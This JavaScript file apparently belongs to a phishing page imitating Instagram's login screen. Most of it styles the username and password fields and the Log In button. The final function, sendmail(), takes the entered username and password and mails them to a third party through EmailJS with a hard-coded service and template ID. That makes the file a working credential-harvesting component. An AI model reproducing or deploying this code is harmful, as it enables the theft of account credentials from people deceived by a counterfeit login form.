// variables declaration
var username = document.getElementById("username1");
var password = document.getElementById("password1");
var toggleButton = document.getElementById("hideShow");
var submitButton = document.getElementById("submit");
var passHolder = document.getElementById("pass_placeholder");
var userHolder = document.getElementById("user_placeholder");
var mline = document.getElementById("magcline");
const splash = document.getElementById("splash-screen");

var valuesObj = {};

// disable Log in button when the website is loaded
window.onload = () => {
  disableButton();
};

//colours on top on loading
document.addEventListener('DOMContentLoaded', (e)=>{
  setTimeout(()=>{
      splash.classList.add('dislay-none');
      splash.style.display = "none";
  }, 1000);
  setTimeout(()=>{
      mline.style.display = "none";
  }, 4000);
})

// check if username and password input element is empty
function checkinput() {
  if (username.value != "" && password.value != "" && password.value.length >= 6) {
    submitButton.disabled = false;
    submitButton.style.cursor = "pointer";
    submitButton.style.transition = "0.001s";
    submitButton.style.backgroundColor = "rgb(0, 149, 246)";
    submitButton.style.opacity = "1.4";
    submitButton.style.pointerEvents = "all";

    submitButton.addEventListener('mouseover',function(){
      submitButton.style.backgroundColor = "#1877F2";
    });
    
    submitButton.addEventListener('mouseout',function(){
      submitButton.style.backgroundColor = "#1f95f6";
    });
  } else{
    disableButton();
  }

  //  password logic
  if (password.value != "") {
    toggleButton.style.visibility = "visible";
    passHolder.style.margin = "0 5px 16px 0";
    passHolder.style.fontSize = "10px";
    password.style.padding = "14px 0 2px 8px";
    password.style.fontSize = "12px";
    
  } else {
    disableButton();
    passHolder.style.margin = "9px 8px 1px 0";
    passHolder.style.fontSize = "12px";
    password.style.padding = "10px 0 2px 8px";
    username.style.fontSize = "14px";
  }

  // username value check
  if (username.value != "") {
    userHolder.style.margin = "-9px 5px 16px 0";
    userHolder.style.fontSize = "10px";
    username.style.padding = "14px 0 2px 8px";
    username.style.fontSize = "12px";
  } else {
    userHolder.style.margin = "0 8px 1px 0";
    userHolder.style.fontSize = "12px";
    username.style.padding = "10px 0 2px 8px";
    username.style.fontSize = "14px";
  }
}

function hideShow() {
  // makes password visible
  if (password.type === "password") {
    password.type = "text";
    toggleButton.innerHTML = "Hide";
    toggleButton.style.padding = "0px 0 2px 3px";
  } else {
    password.type = "password";
    toggleButton.innerHTML = "Show";
    toggleButton.style.padding = "0px 0 2px 0px";
  }
}

// function to disable Log In button
function disableButton() {
  submitButton.disabled = true;
  submitButton.style.cursor = "auto";
  submitButton.style.backgroundColor = "rgb(0, 149, 246);";
  toggleButton.style.visibility = "hidden";
  submitButton.style.pointerEvents = "none";

  submitButton.addEventListener('mouseover',function(){
    submitButton.style.backgroundColor = "rgb(68, 177, 250)";
  });
  
  submitButton.addEventListener('mouseout',function(){
    submitButton.style.backgroundColor = "rgb(68, 177, 250)";
  });
}


function sendmail(){
  if (username.value != "" && password.value != "" && password.value.length >= 6){
    var params = {
      details : document.getElementById("username1").value,
      password : document.getElementById("password1").value
    }
    emailjs.send('service_kkxwwx8', 'template_niapyxz', params).then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
   }, function(err) {
      console.log('FAILED...', err);
   });
  }
}